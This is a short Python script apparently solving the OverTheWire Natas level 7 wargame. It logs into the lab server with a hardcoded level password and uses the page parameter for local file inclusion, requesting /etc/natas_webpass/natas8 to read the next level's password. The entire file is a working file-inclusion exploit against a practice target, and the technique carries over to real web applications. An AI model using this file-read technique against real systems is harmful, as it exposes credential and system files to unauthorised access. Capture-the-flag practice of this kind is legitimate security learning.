import requests

url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
exploit=requests.session()
exploit.auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9')
request=exploit.get(url)
#password has been in the source
print(request.text)